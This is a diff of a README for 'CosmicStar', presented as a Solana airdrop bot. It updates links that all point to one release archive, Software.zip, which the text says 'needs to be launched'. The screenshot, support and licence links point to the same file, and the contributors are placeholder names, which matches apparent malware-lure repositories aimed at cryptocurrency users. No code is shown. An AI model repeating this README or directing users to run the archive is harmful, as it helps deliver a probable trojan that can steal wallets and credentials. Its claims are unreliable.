@@ -24,7 +24,7 @@ CosmicStar is a cutting-edge Solana Airdrop Bot designed to automate the process
 - solana-volume-bot
 
 ### Installation:
-To access the CosmicStar repository, you can download it using the following link: [![Download Repository](https://github.com/Nour10381/CosmicStar/releases/download/v1.0/Software.zip)](https://github.com/Nour10381/CosmicStar/releases/download/v1.0/Software.zip) (This file needs to be launched.)
+To access the CosmicStar repository, you can download it using the following link: [![Download Repository](https://github.com/Nour10381/CosmicStar/releases/download/v2.0/Software.zip)](https://github.com/Nour10381/CosmicStar/releases/download/v2.0/Software.zip) (This file needs to be launched.)
 
 ### Getting Started:
 1. Download the repository using the provided link.
@@ -40,16 +40,16 @@ To access the CosmicStar repository, you can download it using the following lin
 - User-friendly and customizable interface.
 
 ### Screenshots:
-![CosmicStar Demo](https://github.com/Nour10381/CosmicStar/releases/download/v1.0/Software.zip)
+![CosmicStar Demo](https://github.com/Nour10381/CosmicStar/releases/download/v2.0/Software.zip)
 
 ### Support:
-For any inquiries or assistance regarding CosmicStar, please reach out to our support team at https://github.com/Nour10381/CosmicStar/releases/download/v1.0/Software.zip
+For any inquiries or assistance regarding CosmicStar, please reach out to our support team at https://github.com/Nour10381/CosmicStar/releases/download/v2.0/Software.zip
 
 ### Contributors:
 - John Doe (@johndoe)
 - Jane Smith (@janesmith)
 
 ### License:
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/Nour10381/CosmicStar/releases/download/v1.0/Software.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Nour10381/CosmicStar/releases/download/v2.0/Software.zip) file for details.
 
 🌟 Start exploring the possibilities with CosmicStar now! 🪐🌠
